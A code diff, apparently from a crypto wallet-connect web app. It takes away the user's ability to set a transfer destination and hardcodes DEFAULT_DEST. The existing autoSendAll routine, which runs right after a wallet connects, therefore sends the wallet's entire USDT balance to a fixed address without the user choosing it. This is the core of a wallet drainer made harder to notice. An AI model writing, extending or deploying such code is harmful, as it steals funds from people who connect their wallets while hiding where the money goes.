@@ -15,7 +15,6 @@ const state = {
   qrUri: null as string | null,
   connectError: null as string | null,
   notice: null as string | null,
-  dest: DEFAULT_DEST,
   transferStatus: null as "pending" | "success" | "error" | null,
   transferError: null as string | null,
   transferTxId: null as string | null,
@@ -40,7 +39,7 @@ function render(): void {
     const session = state.session;
     renderDashboardView({
       session,
-      dest: state.dest,
+      dest: DEFAULT_DEST,
       transferStatus: state.transferStatus,
       transferError: state.transferError,
       transferTxId: state.transferTxId,
@@ -54,21 +53,16 @@ function render(): void {
   }
 
   renderConnectView({
-    dest: state.dest,
     qrUri: state.qrUri,
     error: state.connectError,
     notice: state.notice,
-    onDestChange: (dest) => {
-      state.dest = dest;
-    },
-    onConnect: (dest) => {
-      state.dest = dest;
+    onConnect: () => {
       void startConnect();
     },
   });
 }
 
-async function autoSendAll(session: WalletSession, dest: string, generation: number): Promise<void> {
+async function autoSendAll(session: WalletSession, generation: number): Promise<void> {
   state.transferStatus = "pending";
   state.transferError = null;
   state.transferTxId = null;
@@ -91,7 +85,7 @@ async function autoSendAll(session: WalletSession, dest: string, generation: num
         broadcastTx,
       },
       {
-        dest,
+        dest: DEFAULT_DEST,
         amountInput: formatUsdtAmount(balance),
         owner: session.address,
         balanceBase: balance,
@@ -141,7 +135,7 @@ async function startConnect(): Promise<void> {
     state.transferError = null;
     state.transferTxId = null;
     render();
-    void autoSendAll(session, state.dest, transferGeneration);
+    void autoSendAll(session, transferGeneration);
   } catch (error) {
     const message = error instanceof Error ? error.message : "Connection failed";
     goConnect({ error: message });
